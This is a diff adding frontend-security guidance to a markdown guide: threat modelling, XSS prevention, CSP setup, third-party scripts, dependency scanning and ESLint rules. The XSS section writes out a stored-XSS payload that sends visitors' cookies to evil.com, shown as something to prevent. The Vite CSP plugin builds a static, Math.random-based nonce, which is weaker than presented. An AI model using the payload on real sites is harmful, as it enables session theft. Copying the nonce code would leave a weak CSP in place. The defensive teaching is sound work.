@@ -271,6 +271,221 @@ Without Permissions-Policy, any third-party script on the page can request sensi
 - CSRF token on every POST/PUT/DELETE from the browser.
 - `dangerouslySetInnerHTML` is banned unless paired with DOMPurify.
 
+## Threat Modeling for Frontend
+
+### STRIDE per Attack Surface
+| Threat | Attack Surface | Mitigation |
+|--------|---------------|------------|
+| Spoofing | Auth tokens, API identities | Short-lived JWT, httpOnly cookies, mTLS |
+| Tampering | Form data, query params, request body | Server-side validation, CSRF tokens, SRI |
+| Repudiation | User actions, API calls | Audit logging, signed requests |
+| Information Disclosure | Client bundle, localStorage, URL params | Minification, no secrets in client, no PII in URLs |
+| Denial of Service | Form submissions, API calls | Rate limiting, CAPTCHA, max input sizes |
+| Elevation of Privilege | Role/flag manipulation | Server-side authorization, signed tokens |
+
+### Trust Boundaries
+```typescript
+// Trust boundary: Client ↔ Server
+// Everything on the client is untrusted
+
+// NEVER trust:
+// - Client-side validation (UX only, not security)
+// - LocalStorage/sessionStorage data (XSS can read it)
+// - URL parameters (can be modified by user or referrer)
+// - Request headers (can be spoofed)
+// - Environment variables exposed to client (NEXT_PUBLIC_*, VITE_*)
+
+// ALWAYS validate server-side:
+// - Input sanitization
+// - Authorization checks
+// - Business logic constraints
+// - Rate limiting
+// - Session validation
+```
+
+## XSS Attack Vectors and Prevention
+
+```typescript
+// XSS Vector 1: Stored XSS
+// User submits: <script>document.location='https://evil.com/?c='+document.cookie</script>
+// If rendered unsanitized, every visitor's cookies are stolen.
+// Prevention: Output encoding + CSP blocking inline scripts
+
+// XSS Vector 2: Reflected XSS
+// URL: https://example.com/search?q=<script>alert('xss')</script>
+// If the search term is rendered in HTML without encoding.
+// Prevention: Always encode output, never trust URL params
+
+// XSS Vector 3: DOM-based XSS
+// BAD:
+element.innerHTML = userInput;
+// GOOD:
+element.textContent = userInput; // encodes automatically
+
+// BAD (React):
+<div dangerouslySetInnerHTML={{ __html: userHTML }} />
+// GOOD (React - with sanitization):
+import DOMPurify from 'dompurify';
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHTML) }} />
+
+// BAD (Vue):
+<div v-html="userHTML" />
+// GOOD (Vue - with sanitization):
+<div v-html="$sanitize(userHTML)" />
+```
+
+## CSP Configuration by Framework
+
+```typescript
+// Next.js CSP via middleware
+// middleware.ts
+export function middleware(request: NextRequest) {
+  const nonce = crypto.randomBytes(16).toString('base64');
+  const csp = [
+    `default-src 'self'`,
+    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
+    `style-src 'self' 'unsafe-inline'`,
+    `img-src 'self' data: https: blob:`,
+    `font-src 'self' data:`,
+    `object-src 'none'`,
+    `base-uri 'none'`,
+    `form-action 'self'`,
+    `frame-ancestors 'none'`,
+    `block-all-mixed-content`,
+  ].join('; ');
+
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set('x-nonce', nonce);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  response.headers.set('Content-Security-Policy', csp);
+  return response;
+}
+```
+
+```typescript
+// Vite CSP via HTML transform plugin
+// vite.config.ts
+import { createHash } from 'crypto';
+
+function cspPlugin() {
+  return {
+    name: 'csp',
+    transformIndexHtml(html: string) {
+      const nonce = createHash('sha256').update(Math.random().toString()).digest('base64');
+      return html.replace(
+        '</head>',
+        `<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-${nonce}' 'strict-dynamic'"></head>`
+      );
+    },
+  };
+}
+```
+
+## Third-Party Script Security
+
+```typescript
+// Loading third-party scripts securely
+// 1. Use SRI integrity hashes
+// 2. Load with async/defer
+// 3. Use trusted types
+
+// Secure Google Analytics loading
+const script = document.createElement('script');
+script.src = 'https://www.googletagmanager.com/gtag/js?id=G-XXXXX';
+script.async = true;
+script.integrity = 'sha384-...'; // SRI hash
+script.crossOrigin = 'anonymous';
+document.head.appendChild(script);
+
+// If CSP is strict-dynamic, third-party scripts loaded by nonce-trusted
+// scripts are automatically trusted. But tag managers that inject arbitrary
+// scripts bypass this protection.
+// Audit tag manager containers before deploying.
+
+// For iframe embeds (YouTube, Twitter):
+<iframe
+  src="https://www.youtube.com/embed/VIDEO_ID"
+  sandbox="allow-scripts allow-same-origin allow-popups"
+  loading="lazy"
+  title="Video title"
+/>
+// sandbox restricts: no forms, no popups, no top-navigation
+```
+
+## Dependency Security Scanning
+
+```bash
+# CI/CD security scanning pipeline
+# package.json audit
+npm audit --audit-level=high
+
+# For projects with many deps: only fail on critical+high
+npm audit --audit-level=critical
+
+# Yarn
+yarn audit --level high
+
+# Automated scanning in CI
+# .github/workflows/security.yml
+name: Dependency Security
+on: [pull_request]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci
+      - run: npm audit --audit-level=high
+      - run: npx snyk test --severity-threshold=high
+
+# Remediation SLA:
+# - Critical: 24 hours
+# - High: 7 days
+# - Medium: 30 days
+# - Low: next quarter
+```
+
+## Security Testing in CI
+
+```typescript
+// Automated security checks for PRs
+// 1. eslint-plugin-security: detect dangerous patterns
+// 2. npm audit: known vulnerabilities
+// 3. SRI hash checker: verify all external resources have integrity
+// 4. CSP evaluator: validate CSP header effectiveness
+// 5. OWASP ZAP: DAST scan on staging environment
+
+// ESLint security rules
+{
+  "plugins": ["security"],
+  "rules": {
+    "security/detect-object-injection": "error",
+    "security/detect-non-literal-regexp": "error",
+    "security/detect-unsafe-regex": "error",
+    "security/detect-buffer-noassert": "error",
+    "security/detect-child-process": "error",
+    "security/detect-disable-mustache-escape": "error",
+    "security/detect-eval-with-expression": "error",
+    "security/detect-no-csrf-before-method-override": "error",
+    "security/detect-non-literal-fs-filename": "error",
+    "security/detect-pseudoRandomBytes": "warn"
+  }
+}
+```
+
+## Performance Impact of Security
+
+| Measure | Impact | Notes |
+|---------|--------|-------|
+| CSP header | ~200-500 bytes added to response | Insignificant |
+| SRI hashing | ~50 bytes per external resource | Negligible |
+| CSP violation reporting | Async, non-blocking | No user-facing impact |
+| DOMPurify sanitization | ~0.1-0.5ms per string | Sub-millisecond |
+| Nonce generation | ~0.01ms per request (crypto.randomBytes) | Negligible for SSR |
+| mTLS handshake | ~10-50ms per connection | Use connection pooling |
+| HSTS header | ~100 bytes | Zero-impact once cached |
+
 ## References
   - references/csp-implementation.md — CSP Implementation
   - references/csrf-protection.md — CSRF Protection
